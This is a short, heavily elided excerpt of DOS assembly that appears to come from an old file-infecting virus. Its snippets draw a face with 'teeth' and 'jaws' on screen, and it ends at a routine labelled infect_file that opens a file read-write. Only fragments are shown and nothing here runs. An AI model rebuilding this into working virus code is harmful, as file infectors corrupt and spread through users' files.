...
draw_face:	mov	ah,01		                  ;set cursor type
            	mov	cl,00
  		mov	ch,40h
		int	10h
...
make_teeth:	mov	ah,02		                  ;set cursor position
		mov	dh,02		                  ;to row 2
		int	10h
...
pause_1:    	mov	cx,7fffh

a_loop:	    	loop	 a_loop		                ;pause
		inc	 byte ptr count
...
close_jaws: 	mov	 ah,06		                  ;scroll the page up
...
pause_2:	mov	  cx,7fffh

finish_up:  	loop	  finish_up
...
infect_file:    mov     ax,03D02h               ; DOS open file function,
                                                ; read-write
